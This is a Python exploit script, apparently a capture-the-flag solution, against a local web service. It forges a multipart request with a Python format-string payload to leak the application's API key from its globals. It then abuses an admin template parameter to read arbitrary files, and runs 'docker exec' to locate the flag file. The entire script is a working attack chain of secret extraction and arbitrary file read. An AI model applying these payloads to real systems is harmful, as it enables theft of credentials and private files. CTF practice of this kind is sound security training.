import httpx
import re

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
    return r.text, r.status_code

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 查看容器内根目录的文件
    print("\n[*] Listing files in container...")
    result = httpx.get(f"{TARGET}/", timeout=10.0)
    
    # 使用 docker exec 查看 flag 文件名
    import subprocess
    result = subprocess.run(['docker', 'exec', 'cutter_local', 'ls', '-la', '/'], capture_output=True, text=True)
    print(result.stdout)
    
    # 找到 flag 文件
    flag_files = re.findall(r'flag-[a-f0-9]{32}\.txt', result.stdout)
    if flag_files:
        flag_file = flag_files[0]
        print(f"\n[!] Found flag file: {flag_file}")
        
        # 读取 flag
        content, code = read_file_via_admin(api_key, f"/{flag_file}")
        print(f"[FLAG] {content}")
